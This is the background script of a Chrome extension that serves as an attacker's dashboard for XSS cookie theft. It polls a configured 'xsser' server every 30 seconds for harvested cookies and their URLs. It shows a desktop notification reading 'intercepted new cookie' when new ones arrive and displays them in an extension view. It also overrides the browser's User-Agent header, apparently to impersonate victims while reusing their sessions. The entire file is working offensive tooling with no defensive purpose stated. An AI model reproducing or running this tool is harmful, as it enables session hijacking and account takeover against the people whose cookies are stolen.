//create by sogili(@jackmasa)
//changed by lietdai@gmail.com
window.__defineGetter__('xsser',function(){return localStorage.getItem('xsser')});

function load(){
	var xhr = new XMLHttpRequest();
	xhr.onload=function(){
		var data = xhr.responseText;
		var last_cookies = JSON.parse(localStorage.getItem('data'));
		var cookies = JSON.parse(data);
		if(last_cookies&&cookies&&last_cookies[0].url!=cookies[0].url&&last_cookies[0].cookie!=cookies[0].cookie){
			var notification = webkitNotifications.createNotification(
				'note.jpg',
				'截获新cookie',
				JSON.parse(data)[0].url
			);
			notification.show();
		}
		localStorage.setItem('data',data);
		try{chrome.extension.getViews()[1].render(cookies)}catch(e){}
	}
	xhr.open('GET',xsser+'?'+Math.random());
	xhr.send(null);
}

setInterval(function(){
	xsser&&load();
},30000);

chrome.extension.onMessage.addListener(function(xsser) {
	localStorage.clear();
	localStorage.setItem('xsser',xsser);
	load();
});

function getUA(){
    return localStorage.ua ? localStorage.ua : false;
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
        for(var i=0, headerLen=details.requestHeaders.length; i<headerLen; ++i){
            if(details.requestHeaders[i].name == 'User-Agent'){
                var ua = getUA();
                if(ua){
                    details.requestHeaders[i].value = ua;
                }
                break;
            }
        }
    return {requestHeaders: details.requestHeaders};
  },
  {urls: []},
  ['requestHeaders', 'blocking']
);
